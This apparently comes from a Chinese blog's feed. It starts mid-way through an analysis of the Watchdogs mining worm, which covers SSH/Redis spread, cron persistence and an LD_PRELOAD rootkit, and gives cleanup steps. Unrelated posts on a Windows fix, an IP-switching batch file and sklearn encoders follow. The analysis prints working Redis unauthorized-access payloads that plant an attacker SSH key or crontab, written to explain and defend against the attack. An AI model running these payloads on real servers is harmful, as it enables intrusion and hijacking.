&amp;&amp; chmod +x /tmp/watchdogs</span><br></pre></td></tr></table></figure><p>如上图所示，本次蠕虫的横向传播分为两块。</p><p>一是Bash脚本包含的如下内容，会直接读取主机上的/root/.ssh/known_hosts和/root/.ssh/id_rsa.pub文件，用于登录信任当前主机的机器，并控制这些机器执行恶意指令。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v13zzr57j20ix036my8.jpg" alt></p><p>二是Bash脚本下载的Watchdogs程序，通过对Redis的未授权访问和爆破、以及对SSH的爆破，进行横向传播。</p><p>具体为表现为，Watchdogs程序的Bbgo()函数中，首先获取要攻击的ip列表，随后尝试登录其他主机的ssh服务，一旦登录成功则执行恶意脚本下载命令。在Ago()函数中，则表现为针对其他主机Redis的扫描和攻击。</p><p>恶意Bash脚本</p><p>除了下载Watchdogs程序和横向传播外，Bash脚本还具有以下几项功能。</p><ol><li><p>将下载自身的指令添加到crontab定时任务里面，定时执行。</p></li><li><p>杀死同类的挖矿僵尸木马进程。</p></li><li><p>杀死CPU占用大于80%的进程</p></li></ol><p>bash脚本的功能也很很常见，一般来说挖矿程序几乎都有这样的功能。</p><p>Watchdogs程序为elf可执行文件，由go语言编译，其主要函数结构如下所示：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v14wnj8cj207v09nq2w.jpg" alt></p><p>1.<code>LibiosetWrite()</code></p><p>该函数主要执行libioset.so文件的写入</p><p>2.<code>Cron()</code></p><p>将恶意下载命令添加到/etc/cron.d/root等多个文件中，定时执行，加大清理难度</p><p>3.<code>KsoftirqdsWriteRun()</code></p><p>解压并写入挖矿程序及其配置文件</p><p>Bbgo()和Ago()函数的功能在“蠕虫传播方式”一节已有介绍，此处不再赘述。</p><p>综上，Watchdogs程序在Bash脚本执行的基础上，将进一步进行挖矿程序的释放和执行、恶意so文件写入以及剩余的横向传播。</p><p><code>libioset.so</code>分析</p><p>如图是<code>libioset.so</code>的导出函数表，包括<code>unlink</code>, <code>rmdir</code>, <code>readdir</code>等。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1627gnej20rs0lqaay.jpg" alt></p><p>这里以执行rm命令必须调用的unlink()函数为例。</p><p>它只对不包含”ksoftirqds”、”ld.so.preload”、”libioset.so”这几个字符串的文件调用正常的unlink()，导致几个文件无法被正常删除。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v16ez6vbj2192042js9.jpg" alt></p><p>其他几个命令，如<code>readdir</code>也是类似，无法正常返回关于恶意程序的结果。</p><p>而<code>fopen</code>函数更是变本加厉，由于系统查询<code>cpu</code>使用情况和端口占用情况时，都会调用<code>fopen</code>，于是攻击者<code>hook</code>了这一函数，使其在读取<code>&#39;/proc/stat&#39;</code>和<code>&#39;/proc/net/tcp&#39;</code>等文件时，调用伪造函数。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1737f5rj20r602qwez.jpg" alt></p><p>其中<code>forge_proc_cpu()</code>函数，将返回硬编码的字符串</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v17j9t4kj21c80eo0ul.jpg" alt></p><p>这种对查看系统状态功能的恶意hook，导致用户难以通过简单自查，确定挖矿是否存在以及挖矿进程是哪个。</p><p>“许多黑客模仿我的代码”——数据库蠕虫趋势统计</p><p>此次的Watchdogs挖矿蠕虫与18年出现的kworkerd蠕虫出自同一位作者（关于kworkerd挖矿僵尸网络参见《2018年云上挖矿分析报告》），因为它们使用了相同的钱包地址和相似的攻击手法。此外作者在恶意脚本末尾的注释也印证了这点：</p><p>#1.If you crack my program, please don’t reveal too much code online.Many hacker boys have copied my kworkerds code,more systems are being attacked.(Especially libioset)…</p><p>这段注释同时也揭露了一个事实，“许多黑客模仿我的代码”——当一个攻击者采取了某种攻击手法并取得成功，其他攻击者会纷纷模仿，很快将该手段加入自己的“攻击大礼包”。</p><p>这种模仿的结果是，据阿里云安全不完全统计，利用Redis未授权访问等问题进行攻击的蠕虫，数量已从2018年中的一个，上涨到如今的40余个，其中不乏DDG、8220这样臭名昭著的挖矿团伙。此外大部分近期新出现的蠕虫，都会加上Redis利用模块，因为实践证明互联网上错误配置的Redis数据库数量庞大，能从其中分一杯羹，攻击者的盈利就能有很大的提升。</p><p>因而如果不保护好Redis，用户面临的将不是一个蠕虫，而是40余个蠕虫此起彼伏的攻击。</p><p>下图所示为近半年来，针对Redis的攻击流量和目标机器数量趋势，从中不难看出Redis攻击逐渐被各大僵尸网络采用，并在2018年10月11月保持非常高的攻击量；而后在经历了3个月左右的沉寂期后，在今年2月再次爆发。</p><p>而Redis本身遭受攻击的主流方法也经过了三个阶段</p><p>1.攻击者对存在未授权访问的Redis服务器写入ssh key，从而可以畅通无阻登录ssh服务</p><p>具体为执行以下payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x "\n\n\nssh-rsa 【sshkey】 root@kali\n\n\n"</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>其中【sshkey】表示攻击者的密钥</p><p>2.攻击者对存在未授权访问的<code>Redis</code>服务器写入<code>crontab</code>文件，定时执行恶意操作</p><p>具体为执行以下<code>payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x "【evil command】"</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>3.以上两个阶段中仅对<code>Redis</code>完全没有验证即可访问的情况，第三个阶段则开始针对设置了密码验证，但密码较弱的<code>Redis</code>进行攻击，受害范围进一步扩大。</p><p>然而<code>Redis</code>并不是唯一一个受到黑客“青眼”的数据库。如下表所示，<code>SQL Server</code>, <code>Mysql</code>, <code>Mongodb</code>这些常用数据库的安全问题，也被多个挖矿僵尸网络所利用；利用方式集中在未授权访问、密码爆破和漏洞利用。</p><h3 id="处理办法"><a href="#处理办法" class="headerlink" title="处理办法"></a>处理办法</h3><p>1.首先停止<code>cron</code>服务，避免因其不断执行而导致恶意文件反复下载执行。</p><p>如果操作系统可以使用service命令，则执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond stop</span><br></pre></td></tr></table></figure><p>如果没有service命令，执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cron stop</span><br></pre></td></tr></table></figure><p>2.随后使用<code>busybox</code>删除以下两个so文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo busybox rm -f /etc/ld.so.preload</span><br><span class="line">sudo busybox rm -f /usr/local/lib/libioset.so</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p><code>busybox</code>是一个小巧的<code>unix</code>工具集，许多<code>Linux</code>系统装机时已集成。使用它进行删除是因为系统自带的<code>rm</code>命令需要进行动态<code>so</code>库调用，而<code>so</code>库被恶意<code>hook</code>了，无法进行正常删除；而<code>busybox</code>的<code>rm</code>是静态编译的，无需调用<code>so</code>文件，所以不受影响。</p><p>3.清理恶意进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo kill -9 `ps -ef|grep Watchdogs|grep -v grep |awk '&#123;print $2&#125;'`</span><br><span class="line">sudo kill -9 `ps -ef|grep ksoftirqds|grep -v grep |awk '&#123;print $2&#125;'`</span><br></pre></td></tr></table></figure><p>4.清理cron相关文件，重启服务，具体为检查以下文件并清除其中的恶意指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line">/var/spool/cron/root</span><br><span class="line">/etc/cron.d/root</span><br></pre></td></tr></table></figure><p>之后执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond start</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cron start</span><br></pre></td></tr></table></figure><p>如果执行了以上操作任然发现有挖矿程序在运行的话，基本可以判断为机器上任然有病毒程序没有删除干净，对症下药即可。</p><h3 id="来自阿里云的安全建议"><a href="#来自阿里云的安全建议" class="headerlink" title="来自阿里云的安全建议"></a>来自阿里云的安全建议</h3><p>数字加密货币的获取依赖计算资源的特质，催生了黑客进行大规模入侵的动机和土壤；类似Watchdogs蠕虫这样的数据库入侵事件，不是第一起，也不会是最后一起。阿里云作为“编写时即考虑安全性”的平台，提供良好的安全基础设施和丰富的安全产品，帮助用户抵御挖矿和入侵，同时提供以下安全建议：</p><ol><li>在入侵发生之前，加强数据库服务的密码，尽量不将数据库服务开放在互联网上，或根据实际情况进行访问控制（<code>ACL</code>）。这些措施能够帮助有效预防挖矿、勒索等攻击。平时还要注意备份资料，重视安全产品告警。</li><li><p>如果怀疑主机已被入侵挖矿，对于自身懂安全的用户，在攻击者手段较简单的情况下，可以通过自查<code>cpu</code>使用情况、运行进程、定时任务等方式，锁定入侵源头。</p></li><li><p>针对云上的环境，对于攻击者采用较多隐藏手段的攻击（如本次的<code>Watchdogs</code>蠕虫，使<code>ps</code>、<code>top</code>等系统命令失效），建议使用阿里云安全的下一代云防火墙产品，其阻断恶意外联、能够配置智能策略的功能，能够有效帮助防御入侵。哪怕攻击者在主机上的隐藏手段再高明，下载、挖矿、反弹shell这些操作，都需要进行恶意外联；云防火墙的拦截将彻底阻断攻击链。此外，用户还可以通过自定义策略，直接屏蔽<code>pastebin.com</code>、<code>thrysi.com</code>等广泛被挖矿蠕虫利用的网站，达到阻断入侵的目的。</p></li></ol><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1iwxf04j22uk0n4tbu.jpg" alt></p><p>如图是云防火墙帮助用户拦截此次<code>Watchdogs</code>蠕虫下载的例子，图中共拦截23次对<code>pastebin.com</code>的请求；这些拦截导致主机未下载恶意脚本，从而就不会发起对<code>thrysi.com</code>的请求，故规则命中次数为0。</p><ol start="4"><li>对于有更高定制化要求的用户，可以考虑使用阿里云安全管家服务。购买服务后将有经验丰富的安全专家提供咨询服务，定制适合您的方案，帮助加固系统，预防入侵。入侵事件发生后，也可介入直接协助入侵后的清理、事件溯源等，适合有较高安全需求的用户，或未雇佣安全工程师，但希望保障系统安全的企业。</li></ol><h3 id="第一次事件分析"><a href="#第一次事件分析" class="headerlink" title="第一次事件分析"></a>第一次事件分析</h3><p>以上记录的是第二次的挖矿事件，两次挖矿事件有一些区别，第一次<code>hadoop</code>集群上遇到的挖矿事件，被利用的漏洞是yarn提交的漏洞，整个感染流程如下：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1ogyzquj20mo09sab7.jpg" alt></p><p>第二次遇到的漏洞是<code>redis</code>上的漏洞，第二次的挖矿事件更为复杂，简单的Linux命令已经被病毒屏蔽，需要更为复杂的操作才能发现问题的根源。第一次挖矿事件和第二次挖矿事件有一点不同就是第一次的挖矿事件中，在删除<code>crontab</code>命令，删除挖矿脚本之后，仍然出现挖矿操作，通过分析、思考挖矿的逻辑，说明在<code>crontab</code>之前应该还有一层在控制进程，通过分析<code>status</code>之后，果然发现有好几个异常连接，分别是指向荷兰和美国，在<code>iptables</code>里面把这些<code>ip</code>屏蔽掉之后就解决了问题。</p><p>同时这边提供应急解决思路，如果急需使用集群的话，可以根据这些挖矿病毒的特点——<code>CPU</code>高占用，写一个定期删除<code>CPU</code>占用超过<code>95</code>进程的脚本，同样用<code>Crontab</code>定期执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/sh</span><br><span class="line"></span><br><span class="line">NAME=$1</span><br><span class="line">echo $NAME</span><br><span class="line"><span class="meta">#</span>ID=`ps -ef | grep "$NAME" | grep -v "$0" | grep -v "grep" | awk '&#123;print $2&#125;'`</span><br><span class="line">CPU=`ps -aux | grep kworker | sort -rn -k +3 | head -1 | awk &#123;'print $3'&#125; | awk -F. '&#123;print $1&#125;'`</span><br><span class="line">ID=`ps -aux | grep kworker  | sort -rn -k +3 | head -1 | awk &#123;'print $2'&#125;`</span><br><span class="line">echo $CPU</span><br><span class="line">echo $ID</span><br><span class="line">echo "---------------"</span><br><span class="line">sleep 1s</span><br><span class="line">if [ $CPU -ge 95 ]; then</span><br><span class="line">   echo "killed $ID"</span><br><span class="line">   kill -9 $ID</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>然后<code>crontab -e</code>执行定时任务每分钟执行该脚本</p><p><code>crontab -e</code></p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /etc/init.d/killprocess.sh</span><br></pre></td></tr></table></figure><p>### </p><p>币圈多少也涉及一点，之前<code>BTC</code>劫持软件劫持下来的<code>BTC</code>所在地址根本没动，确实这个钱没有办法提现，应该时刻都被监控着。所以这次接触的挖矿脚本涉及的都是带匿名属性的数字货币。区块链在17 18年刮起的一阵风暴不知道还有没有后续了。</p><p>最后附上阿里云2019年1月发布的云上挖矿分析报告（双击打开）。</p><p><a href="https://paper.seebug.org/806/" target="_blank" rel="noopener">阿里云上挖矿分析报告</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;京东云和公司集群分别遇到过一次挖矿脚本，经过分析，发现两次挖矿事件有所不同，在这篇文档记录下两次挖矿事件的异同、总结和反思。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="Security" scheme="http://yoursite.com/categories/Hadoop/Security/"/>
    
    
      <category term="病毒" scheme="http://yoursite.com/tags/%E7%97%85%E6%AF%92/"/>
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="脚本" scheme="http://yoursite.com/tags/%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>win10搜索栏失效</title>
    <link href="http://yoursite.com/2019/05/10/win10%E6%90%9C%E7%B4%A2%E6%A0%8F%E5%A4%B1%E6%95%88/"/>
    <id>http://yoursite.com/2019/05/10/win10搜索栏失效/</id>
    <published>2019-05-09T17:57:53.871Z</published>
    <updated>2019-05-09T18:01:34.648Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>打开电脑突然发现，win10菜单的快速搜索APP功能失效了</p></blockquote><a id="more"></a> <p>稍微研究了一下，很简单，两步解决<br>第一步</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start powershell</span><br></pre></td></tr></table></figure><p>第二步，在弹出的新窗口中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-AppXPackage -Name Microsoft.Windows.Cortana | Foreach &#123;Add-AppxPackage -DisableDevelopmentMode -Register "$($_.InstallLocation)\AppXManifest.xml"&#125;</span><br></pre></td></tr></table></figure><p>bingo！</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;打开电脑突然发现，win10菜单的快速搜索APP功能失效了&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Win" scheme="http://yoursite.com/categories/Win/"/>
    
      <category term="win10 bugs" scheme="http://yoursite.com/categories/Win/win10-bugs/"/>
    
    
      <category term="Win" scheme="http://yoursite.com/tags/Win/"/>
    
      <category term="Tips" scheme="http://yoursite.com/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>win环境下更换IP的批处理</title>
    <link href="http://yoursite.com/2019/05/09/%E6%89%B9%E5%A4%84%E7%90%86%E6%9B%B4%E6%94%B9IP/"/>
    <id>http://yoursite.com/2019/05/09/批处理更改IP/</id>
    <published>2019-05-09T12:42:28.753Z</published>
    <updated>2019-05-09T06:45:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>之前公司IP地址出了点问题，要两个IP来回切换，找了个脚本一运行就出现问题，这边记录一下<br>脚本里面的网络名称尽量用英文的，先去网络适配里面更改一下，因为我这边尝试用原来的“本地连接”名字会出现乱码的情况，可能和命令行的编码有关</p></blockquote><a id="more"></a> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">cls</span><br><span class="line">color 0A</span><br><span class="line"> </span><br><span class="line">@echo off</span><br><span class="line">echo.</span><br><span class="line">echo ===change IP?==</span><br><span class="line">echo.</span><br><span class="line">echo 1:auto</span><br><span class="line">echo.</span><br><span class="line">echo 2:zt</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">set/p sel=changestyle</span><br><span class="line">if &quot;%sel%&quot;==&quot;1&quot; goto auto</span><br><span class="line">if &quot;%sel%&quot;==&quot;2&quot; goto zt</span><br><span class="line">echo you dont choose</span><br><span class="line">goto end</span><br><span class="line"> </span><br><span class="line">:auto</span><br><span class="line">netsh interface ip set address name=&quot;local connection&quot; source=dhcp</span><br><span class="line">netsh interface ip delete dns &quot;local connection&quot; all</span><br><span class="line">ipconfig /flushdns</span><br><span class="line">ipconfig /all</span><br><span class="line">goto end</span><br><span class="line"> </span><br><span class="line">:zt</span><br><span class="line">echo waiting...</span><br><span class="line">netsh interface ip set address name=&quot;local connection&quot; source=static addr=10.0.20.22 mask=255.255.248.0 gateway=10.0.16.1 gwmetric=1</span><br><span class="line">netsh interface ip set dns name=&quot;local connection&quot; source=static addr=222.96.134.133</span><br><span class="line">netsh interface ip add dns name=&quot;local connection&quot; addr=222.96.128.68 index=2 </span><br><span class="line">ipconfig /flushdns</span><br><span class="line">ipconfig /all</span><br><span class="line">echo finish</span><br><span class="line">goto end</span><br><span class="line"> </span><br><span class="line">:end</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>IP地址是我随便写的，修改IP，保存为.bat后，修改本地连接名称，管理员运行就可以执行</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;之前公司IP地址出了点问题，要两个IP来回切换，找了个脚本一运行就出现问题，这边记录一下&lt;br&gt;脚本里面的网络名称尽量用英文的，先去网络适配里面更改一下，因为我这边尝试用原来的“本地连接”名字会出现乱码的情况，可能和命令行的编码有关&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Win" scheme="http://yoursite.com/categories/Win/"/>
    
      <category term="IP Change" scheme="http://yoursite.com/categories/Win/IP-Change/"/>
    
    
      <category term="Win" scheme="http://yoursite.com/tags/Win/"/>
    
      <category term="Tips" scheme="http://yoursite.com/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>LabelEnconder 和 OneHotEncoder</title>
    <link href="http://yoursite.com/2019/05/09/LabelEnconder/"/>
    <id>http://yoursite.com/2019/05/09/LabelEnconder/</id>
    <published>2019-05-09T12:42:17.912Z</published>
    <updated>2019-05-09T06:42:45.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>不得不说 我还是小看了ML的知识涉及的广度<br>光是ML 100days 的第一天其实涉及的内容就非常多<br>从Sklearn包到pycharm自带的各种BUG都搞的人头大</p><p>总算把这个整的有点明白了</p></blockquote><a id="more"></a> <h3 id="LabelEnconder"><a href="#LabelEnconder" class="headerlink" title="LabelEnconder"></a>LabelEnconder</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEconder</span><br><span class="line">y = data.iloc[:.<span class="number">-1</span>] <span class="comment"># 索引所有的行 最后一列</span></span><br><span class="line"><span class="comment"># 三步</span></span><br><span class="line">le = LabelEnconder() <span class="comment"># 实例化</span></span><br><span class="line">le = le.fit(y) <span class="comment"># 导入数据</span></span><br><span class="line">label = le.transform(y) <span class="comment"># trasform就扣调取结果</span></span><br><span class="line"><span class="comment"># 这边fit了之后可以直接用le.classes_ 查看标签中有多少类别</span></span><br><span class="line">le.classes_</span><br><span class="line"><span class="comment"># 输出 array(['No','Unknown','Yes'],dtype=object)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 也可以直接fit_transform()一步到位</span></span><br><span class="line">le.fit_transform(y)</span><br><span class="line"><span class="comment"># 这样看不到属性</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从上到下一步到位</span></span><br><span class="line">data.iloc[: , <span class="number">-1</span>] = LabelEncoder().fit_transform(data.iloc[: , <span class="number">-1</span>])</span><br><span class="line"><span class="comment"># 实例化、fit transform 全部完成</span></span><br></pre></td></tr></table></figure><h3 id="OneHotEncoder"><a href="#OneHotEncoder" class="headerlink" title="OneHotEncoder"></a>OneHotEncoder</h3><p>遇到互相不相关的属性，为了避免模型训练的时候把欧式距离计算进去，对结果造成影响<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder</span><br><span class="line">X = data.iloc[:,<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">enc = OneHotEncoder(categories=<span class="string">'auto'</span>).fit(X)</span><br><span class="line">result = enc.transform(X).toarray()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 任然可以一步到位</span></span><br><span class="line">OneHotEncoder(categories=<span class="string">'auto'</span>).fit_transform(X).toattay()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同时这个数值还可以还原</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">pd.DataFrame(enc.inverse_transform(result))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当被哑变量（Onehot）之后，需要一个借口来查看每列的意义</span></span><br><span class="line">enc.get_feature_names()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还有 concat 方法可以将两个表相连</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;不得不说 我还是小看了ML的知识涉及的广度&lt;br&gt;光是ML 100days 的第一天其实涉及的内容就非常多&lt;br&gt;从Sklearn包到pycharm自带的各种BUG都搞的人头大&lt;/p&gt;
&lt;p&gt;总算把这个整的有点明白了&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Mechine-Learning/"/>
    
    
      <category term="sklearn" scheme="http://yoursite.com/tags/sklearn/"/>
    
      <category term="OneHotEncoder" scheme="http://yoursite.com/tags/OneHotEncoder/"/>
    
      <category term="LabelEncoder" scheme="http://yoursite.com/tags/LabelEncoder/"/>
    
  </entry>
  
  <entry>
    <title>Data Preprocessing | Day 1</title>
    <link href="http://yoursite.com/2019/05/09/day01/"/>
    <id>http://yoursite.com/2019/05/09/day01/</id>
    <published>2019-05-09T12:42:17.384Z</published>
    <updated>2019-05-09T01:43:44.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>针对英语文档阅读使用能力和ML知识点开的一个新坑<br>不定期更新<br>尽量使用英语</p></blockquote><a id="more"></a> <h2 id="Data-Preprocessing-Day-1"><a href="#Data-Preprocessing-Day-1" class="headerlink" title="Data Preprocessing | Day 1"></a>Data Preprocessing | Day 1</h2><h3 id="Step-1-Import-the-required-Libraries"><a href="#Step-1-Import-the-required-Libraries" class="headerlink" title="Step 1: Import the required Libraries"></a>Step 1: Import the required Libraries</h3><p>These Two are essential libraries which we will import every time.</p><p>NumPy: Library which contains Mathematical functions.</p><p>Pandas: Library used to import and manage the data sets.</p><h3 id="Step-2-Importing-the-Data-Set"><a href="#Step-2-Importing-the-Data-Set" class="headerlink" title="Step 2: Importing the Data Set"></a>Step 2: Importing the Data Set</h3><p>Data sets are generally available in .csv format. A CSV file stores tabular data in plain text(纯文本). Each lines of the file is a data record. We use the read_csv method of the pandas library to read a local CSV file as a dataframe. Then we make separate(分离) Matrix and Vector of independent and dependent variables from the dataframe.(然后我们从dataframe中制作自变量和因变量的矩阵和向量)</p><h3 id="Step-3-Handling-the-Missing-Data"><a href="#Step-3-Handling-the-Missing-Data" class="headerlink" title="Step 3: Handling the Missing Data"></a>Step 3: Handling the Missing Data</h3><p>The data we get is rarely homogeneous(同质的).Data can be missing due to various and needs to be handled so that it does not reduce the performance of our machine learning model. We can replace the missing data by the Mean or median of the entire column. We use <code>imputer</code> class of <code>sklearn.preprocessing</code> for this task.</p><h3 id="Step-4-Encoding-Categorical-Data"><a href="#Step-4-Encoding-Categorical-Data" class="headerlink" title="Step 4: Encoding Categorical Data"></a>Step 4: Encoding Categorical Data</h3><p>Categorical data are variables that contain label values(标签值) rather than numeric values(数值).The number of possible values is often limited to a fixed set. Example values such as “Yes” and “No” cannot be used in mathematical equations(数学方程) of the model so we need  to encode these variables into numbers. To achieve this we import <code>LabelEncoder</code> class from <code>Sklearn.preprocessing</code> library.</p><h3 id="Step-5-Splitting-the-dataset-into-test-set-and-training-set"><a href="#Step-5-Splitting-the-dataset-into-test-set-and-training-set" class="headerlink" title="Step 5: Splitting the dataset into test set and training set"></a>Step 5: Splitting the dataset into test set and training set</h3><p>We make two partitions of dataset one for training the model called training set and other for testing the performance of the trained model called test set. The split generally 80/20. We import <code>train_test_split()</code> method of <code>sklearn.crossvalidation</code> library.</p><h3 id="Step-6-Feature-Scaling-特征归一化"><a href="#Step-6-Feature-Scaling-特征归一化" class="headerlink" title="Step 6: Feature Scaling(特征归一化)"></a>Step 6: Feature Scaling(特征归一化)</h3><p>Most of the machine learning algorithms use the Euclidean distance(欧式距离) between two data points in their computations, features highly varying(变化) in magnitudes(大小), units and range(范围) pose(提出) problems. high magnitudes(幅度) features will weigh more in the distance calculations than features with low magnitudes. Done by Feature standardization or Z-score normalization(正常化). <code>StandardScalar</code> of <code>sklearn.preprocessing</code> is imported.</p><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">dataset = pd.read_csv(<span class="string">"D:\\APP\\DataSet\\100-Days-Of-ML-Code-master\\datasets\\Data.csv"</span>)</span><br><span class="line">X = dataset.iloc[ : , :<span class="number">-1</span>].values</span><br><span class="line">Y = dataset.iloc[ : , <span class="number">3</span>].values</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span 